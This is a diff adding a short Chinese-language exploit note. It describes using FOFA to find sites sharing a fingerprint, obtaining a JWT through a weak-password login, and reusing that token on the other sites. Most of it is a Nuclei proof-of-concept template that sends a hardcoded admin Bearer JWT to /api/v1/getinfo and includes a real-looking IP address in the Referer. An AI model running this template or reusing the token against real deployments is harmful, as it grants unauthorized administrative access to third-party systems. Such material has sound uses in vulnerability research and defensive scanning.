@@ -1,0 +1,34 @@
+通过fofa上找到相同指纹的网站，弱口令登录拿到jwt，使用其jwt可以登录相同指纹的漏洞。
+
+
+通过nucleit框架写的 jwt_poc.yaml
+```
+id: template-id
+
+info:
+  name: token登录
+  author: changge
+  severity: medium
+  description: description
+  reference:
+    - https://
+  tags: tags
+
+requests:
+  - raw:
+      - |+
+        GET /api/v1/getinfo HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
+        Accept: application/json, text/plain, */*
+        Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3
+        Accept-Encoding: gzip, deflate
+        Referer: http://39.107.117.194:8002/
+        Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTc2ODQ0OTEsImlkZW50aXR5IjoxLCJuaWNlIjoiYWRtaW4iLCJvcmlnX2lhdCI6MTY5NzU5ODA5MSwicm9sZWlkIjoxLCJyb2xla2V5IjoiYWRtaW4iLCJyb2xlbmFtZSI6Iuezu-e7n-euoeeQhuWRmCJ9.UmKujeJ6XOTHrOxGiCPxilGrU7-4EkxdYGrpr1Zn2YU
+        Connection: close
+      matchers:
+          - type: word
+            words:
+              - 200
+            part: body
+```
